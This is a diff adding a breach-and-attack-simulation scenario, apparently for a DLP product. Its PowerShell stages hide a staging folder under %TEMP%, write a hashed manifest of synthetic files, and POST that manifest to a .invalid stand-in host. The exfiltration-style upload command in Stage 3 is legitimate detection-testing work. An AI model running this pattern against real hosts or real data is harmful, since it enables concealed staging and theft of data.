@@ -1,0 +1,160 @@
+id: collection-hidden-staging-manifest-exfil
+product_line: dlp
+name: Hidden Staging Directory with Manifest Probe
+description: >
+  Telemetry-safe emulation of an adversary who hides a staging directory, writes
+  an inventory manifest of what it holds, and sends the manifest out before the
+  data. Covers hidden staging (T1074.001) and the manifest step, which tells an
+  adversary what to exfiltrate. All data is synthetic [BAS-SIM] text under a
+  per-run folder under %TEMP%. The destination is an RFC-6761 .invalid host.
+
+  KILL CHAIN STAGES:
+    1. Hidden Staging    — create a hidden per-run staging folder with synthetic items (T1074.001)
+    2. Manifest Build    — write an inventory of the staged items with sizes and hashes (T1074.001)
+    3. Manifest Upload   — POST the manifest to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: Only this run's folder under %TEMP% is created, hidden, and deleted. No
+  existing file is read or changed. The destination is a .invalid host and cannot
+  resolve. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - staging
+  - manifest
+  - hidden
+  - exfiltration
+  - dlp
+  - t1074
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+  - defense-evasion
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Hidden Staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Hidden Staging 1 — Hidden Synthetic Staging Folder (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Creates a per-run folder under %TEMP% with five synthetic [BAS-SIM] items and sets the hidden attribute on the folder. Only this run's folder is touched. It is deleted in cleanup."
+    telemetry:
+      - "Sysmon EID 11: items created under %TEMP%\\bas_hide_<runid>"
+      - "Sysmon EID 1: attrib.exe or SetAttributes setting the hidden flag"
+    detection:
+      - "EDR: hidden staging folder created in a temp path — concealment IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $root = Join-Path $env:TEMP "bas_hide_$runId"
+      $stage = Join-Path $root 'stage'
+      New-Item -ItemType Directory -Path $stage -Force | Out-Null
+      1..5 | ForEach-Object { Set-Content -Path (Join-Path $stage ("item_{0:d2}.txt" -f $_)) -Value "[BAS-SIM] hidden staging item $_ run=$runId" -Encoding UTF8 }
+      (Get-Item $stage).Attributes = (Get-Item $stage).Attributes -bor [System.IO.FileAttributes]::Hidden
+      $hidden = ((Get-Item $stage).Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
+      $count = @(Get-ChildItem -Path $stage -File -Force).Count
+      Write-Output "EXEC T1074.001: created a hidden staging folder with $count synthetic item(s) (hidden=$hidden). Hidden Stage 1. [BAS-SIM-HID-S1]"
+      if ($hidden) {
+        Write-Output "FAIL: A hidden staging folder was created in a temp path with no alert. Concealed staging is a precursor to exfiltration and should be flagged."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Manifest Build (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Hidden Staging 2 — Inventory Manifest of Staged Items (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes a CSV manifest listing the staged synthetic items with size and SHA-256 hash into the same per-run folder. Nothing is sent in this stage."
+    telemetry:
+      - "Sysmon EID 11: manifest.csv created under %TEMP%\\bas_hide_<runid>"
+      - "Sysmon EID 1: Get-FileHash over the staging folder"
+    detection:
+      - "DLP/EDR: an inventory of staged files produced just before an outbound transfer"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $root = Join-Path $env:TEMP "bas_hide_$runId"
+      $stage = Join-Path $root 'stage'
+      if (-not (Test-Path $stage)) {
+        Write-Output "SKIP: T1074.001: no staging folder from Stage 1. [BAS-SIM-HID-S2]"
+        exit 0
+      }
+      $rows = foreach ($f in (Get-ChildItem -Path $stage -File -Force)) {
+        [pscustomobject]@{ name = $f.Name; bytes = $f.Length; sha256 = (Get-FileHash -Path $f.FullName -Algorithm SHA256).Hash }
+      }
+      $manifest = Join-Path $root 'manifest.csv'
+      $rows | Export-Csv -Path $manifest -NoTypeInformation -Encoding UTF8
+      $n = @(Import-Csv $manifest).Count
+      Write-Output "EXEC T1074.001: wrote a manifest of $n synthetic item(s) with sizes and hashes to $manifest. Hidden Stage 2. [BAS-SIM-HID-S2]"
+      Write-Output "FAIL: An inventory of staged files was generated with no alert. A manifest of what is staged is a pre-exfiltration step that should be visible."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Manifest Upload (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Hidden Staging 3 — Manifest Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the synthetic manifest from Stage 2 to an RFC-6761 .invalid host. The host cannot resolve, so nothing leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress: POST of a CSV whose header lists file names and hashes"
+    detection:
+      - "DLP: a staged-file inventory uploaded to an unknown host"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $manifest = Join-Path $env:TEMP "bas_hide_$runId\manifest.csv"
+      if (-not (Test-Path $manifest)) {
+        Write-Output "SKIP: T1048.003: no manifest from Stage 2 to send. [BAS-SIM-HID-S3]"
+        exit 0
+      }
+      $target = "http://bas-sim-manifest-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $manifest -ContentType 'text/csv' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of the synthetic manifest to $target. reached=$reached (expected: false). Manifest upload Stage 3. [BAS-SIM-HID-S3]"
+      if ($reached) {
+        Write-Output "FAIL: A staged-file manifest was delivered to an unknown host. Egress and DLP are not stopping inventories of staged data leaving the network."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send a staged-file manifest to an unknown host with no alert. Unreachable only because the domain is .invalid."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_hide_*') -Recurse -Force -ErrorAction SilentlyContinue
